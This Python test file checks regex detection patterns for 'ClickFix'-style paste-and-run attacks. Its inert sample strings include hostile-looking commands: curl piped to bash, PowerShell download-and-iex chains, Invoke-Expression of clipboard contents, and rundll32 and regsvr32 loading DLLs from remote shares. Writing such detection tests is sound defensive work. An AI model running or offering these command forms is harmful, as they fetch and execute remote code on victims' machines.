import json
import re
import unittest
from pathlib import Path

import export_clickfix

try:
    import re2
except ModuleNotFoundError as error:
    if error.name != "re2":
        raise
    re2 = None


PATTERNS = json.loads(
    (Path(__file__).resolve().parents[1] / "data" / "patterns.regex.json").read_text(
        encoding="utf-8"
    )
)

# Samples are inert strings; never execute them.
CASES = (
    ("clipboard\\s{0,20}\\.\\s{0,20}writeText",
     "navigator.clipboard.writeText(text)",
     ("navigator.clipboard.readText()", "document.execCommand('paste')")),
    ("win(?:dows)?\\s{0,20}\\+",
     "Open Windows Run dialog and paste the clipboard",
     ("Open Windows Run dialog for settings", "Paste into the browser address bar")),
    ("(?:open|launch)\\s{1,20}",
     "Open Terminal and paste the command",
     ("Open Terminal to check the logs", "Paste into your email client")),
    ("(?:curl|wget)\\b.{0,180}",
     "curl https://example.com/a | bash",
     ("curl https://example.com/status -o status.txt", "wget https://example.net/report")),
    ("-outfile\\b.{0,300}(?:get-content",
     "iwr https://example.com/a -OutFile $f; Get-Content $f -Raw; iex $x",
     ("iwr https://example.com/a -OutFile $f; Get-Content $f -Raw",
      "iwr https://example.net/a -OutFile $f; Write-Output $f")),
    ("\\bnslookup(?:\\.exe)?",
     "nslookup example.com 192.0.2.1 | findstr Name",
     ("nslookup example.com", "nslookup example.com 192.0.2.1")),
    ("\\bfinger(?:\\.exe)?",
     "finger user@example.com | cmd",
     ("finger user@example.com", "copy report.exe %TEMP%\\report.exe")),
    ("\\brundll32(?:\\.exe)?\\s{1,20}",
     r"rundll32 \\example.com@SSL@443\share\file.dll,#1",
     (r"rundll32 C:\Windows\system32\file.dll,#1",
      r"rundll32 \\example.com\share\file.dll,Entry")),
    ("@(?:ssl(?:@[0-9]{1,5})?",
     r"net use X: \\example.com\share",
     (r"net use X: \\internal\share", r"pushd C:\work")),
    ("\\bcmdkey(?:\\.exe)?",
     "cmdkey /add:192.0.2.1 /user:admin",
     ("cmdkey /list", "cmdkey /add:server /user:admin")),
    ("\\bregsvr32(?:\\.exe)?",
     r"regsvr32 \\192.0.2.1\share\test.dll",
     (r"regsvr32 C:\Windows\system32\test.dll",
      r"regsvr32 \\internal\share\test.dll")),
    ("\\bcmd(?:\\.exe)?\\s{1,20}/v:on",
     "cmd /v:on /c set a=hello & set b=world & !a!!b!",
     ("cmd /v:on /c set a=hello & echo !a!",
      "cmd /c set a=hello & set b=world & echo hello")),
    ("\\bpcalua(?:\\.exe)?",
     "pcalua -a powershell.exe https://example.com/a",
     ("pcalua -a setup.exe", "pcalua -a cmd.exe /c echo test")),
    ("\\brem\\s{1,20}",
     "REM verification code 123",
     ("REM routine maintenance", "echo verification code")),
    ("\\bFromBase64String\\s{0,20}",
     "[Convert]::FromBase64String($x); DeflateStream; $pipeline.Invoke()",
     ("[Convert]::FromBase64String($x); Write-Output $x",
      "$x -bxor 42; [ScriptBlock]::Create($y)")),
    ("\\bGet-Clipboard\\b.{0,200}",
     "Invoke-Expression (Get-Clipboard)",
     ("Get-Clipboard | Write-Output", "Invoke-Expression $localScript")),
    ("\\bmsbuild(?:\\.exe)?",
     r"msbuild %TEMP%\sample.proj",
     (r"msbuild C:\src\project.csproj", "msbuild /version")),
    ("osascript\\b)",
     "curl https://example.com/data | osascript",
     ("curl https://example.com/data -o data.txt", "osascript -e 'display dialog 1'")),
    ("(?:gunzip|gzip",
     "curl https://example.com/data | base64 -d | gunzip",
     ("curl https://example.com/data -o data.gz", "gunzip archive.gz")),
    ("\\bdscl\\s{1,20}",
     "dscl . -authonly user placeholder",
     ("dscl . -list /Users", "dscl . -read /Users/example")),
)

ADDITIONAL_POSITIVES = (
    ("\\bnslookup(?:\\.exe)?", "for /f %a in ('nslookup example.com 192.0.2.1') do echo %a"),
    ("\\bfinger(?:\\.exe)?", r"copy C:\Windows\System32\finger.exe %TEMP%\renamed.exe"),
    ("@(?:ssl(?:@[0-9]{1,5})?", r"pushd \\example.com@SSL\share"),
    ("\\bFromBase64String\\s{0,20}", "$x -bxor 42; [ScriptBlock]::Create($y).Invoke()"),
    ("\\bFromBase64String\\s{0,20}", "& ([ScriptBlock]::Create($x))"),
    ("\\bFromBase64String\\s{0,20}", "[Convert]::FromBase64String($x); GZipStream; iex $y"),
    ("\\bnslookup(?:\\.exe)?", "nslookup -type=TXT example.com 192.0.2.1 | findstr Name"),
    ("\\bmsbuild(?:\\.exe)?", r'msbuild "$env:TEMP\sample.proj"'),
    ("\\bmsbuild(?:\\.exe)?", r"msbuild %APPDATA%\sample.proj"),
    ("(?:gunzip|gzip", "curl https://example.net/data | gzip -d"),
)

ADDITIONAL_NEGATIVES = (
    ("\\bnslookup(?:\\.exe)?", "nslookup -type=TXT example.com | findstr Name"),
    ("\\bfinger(?:\\.exe)?", r"copy C:\Windows\System32\finger.exe D:\backup\finger.exe"),
    ("\\bcmd(?:\\.exe)?\\s{1,20}/v:on",
     "cmd /v:on /c set a=hello & set b=world & echo !a!!b!"),
    ("\\bFromBase64String\\s{0,20}",
     "[Convert]::FromBase64String($x); GZipStream; [ScriptBlock]::Create($y)"),
    ("\\bFromBase64String\\s{0,20}", "$x -bxor 42; Write-Output $x"),
    ("\\bGet-Clipboard\\b.{0,200}", "Get-Clipboard" + " " * 201 + "iex"),
)


def combined_regex():
    return "(?s)(?:" + "|".join(
        "(?:" + (pattern[4:] if pattern.startswith("(?s)") else pattern) + ")"
        for pattern in PATTERNS
    ) + ")"


class ManualRegexTests(unittest.TestCase):
    def test_examples(self):
        engines = [re] + ([re2] if re2 is not None else [])
        for marker, positive, negatives in CASES:
            matches = [pattern for pattern in PATTERNS if marker in pattern]
            with self.subTest(marker=marker):
                self.assertEqual(len(matches), 1)
                for engine in engines:
                    compiled = engine.compile(matches[0])
                    self.assertIsNotNone(compiled.search(positive), engine.__name__)
                    for negative in negatives:
                        self.assertIsNone(compiled.search(negative), (engine.__name__, negative))

    def test_additional_variants(self):
        engines = [re] + ([re2] if re2 is not None else [])
        samples = [(marker, sample, True) for marker, sample in ADDITIONAL_POSITIVES]
        samples += [(marker, sample, False) for marker, sample in ADDITIONAL_NEGATIVES]
        for marker, sample, expected in samples:
            matches = [pattern for pattern in PATTERNS if marker in pattern]
            with self.subTest(marker=marker, sample=sample):
                self.assertEqual(len(matches), 1)
                for engine in engines:
                    self.assertEqual(
                        engine.search(matches[0], sample) is not None, expected, engine.__name__
                    )

    def test_base64_placeholder_boundaries(self):
        pattern = export_clickfix.PLACEHOLDER_REGEX["<BASE64>"]
        engines = [re] + ([re2] if re2 is not None else [])
        for engine in engines:
            compiled = engine.compile(pattern)
            for length in (39, 40, 1039, 1040, 16039, 16040, 16383, 16384, 16385):
                with self.subTest(engine=engine.__name__, length=length):
                    self.assertEqual(
                        compiled.fullmatch("A" * length) is not None,
                        40 <= length <= 16384,
                    )
            for sample in ("A" * 40 + "=", "A" * 40 + "==", "A" * 40 + "===",
                           "A" * 40 + "!", "A" * 16384 + "=="):
                with self.subTest(engine=engine.__name__, sample_length=len(sample)):
                    self.assertEqual(
                        compiled.fullmatch(sample) is not None,
                        re.fullmatch(r"[A-Za-z0-9+/]{40,16384}={0,2}", sample) is not None,
                    )
        self.assertEqual(sum(pattern in entry for entry in PATTERNS), 1)

    def test_all_patterns_compile_with_python(self):
        for index, pattern in enumerate(PATTERNS):
            with self.subTest(index=index):
                re.compile(pattern)

    def test_feed_format_and_kql_capture_limit(self):
        self.assertNotIn("paste into File Explorer address bar", PATTERNS)
        self.assertTrue(all(isinstance(pattern, str) for pattern in PATTERNS))
        self.assertEqual(len(PATTERNS), len(set(PATTERNS)))
        compiled = re.compile(combined_regex())
        self.assertLessEqual(compiled.groups, 16)
        self.assertEqual(compiled.groups, 0)
        for marker, _, _ in CASES:
            pattern, = [entry for entry in PATTERNS if marker in entry]
            self.assertTrue(pattern.startswith(("(?i:", "(?is:")))
            self.assertNotRegex(pattern, r"(?<!\\)[*+]")
        lines = (
            Path(__file__).resolve().parents[1] / "data" / "patterns.regex.json"
        ).read_text(encoding="utf-8").splitlines()
        imported = [json.loads(line.strip().removesuffix(",")) for line in lines[1:-1]]
        self.assertEqual(imported, PATTERNS)

    @unittest.skipIf(re2 is None, "google-re2 is not installed")
    def test_all_patterns_compile_with_re2(self):
        for index, pattern in enumerate(PATTERNS):
            with self.subTest(index=index):
                re2.compile(pattern)
        compiled = re2.compile(combined_regex())
        self.assertEqual(compiled.groups, 0)
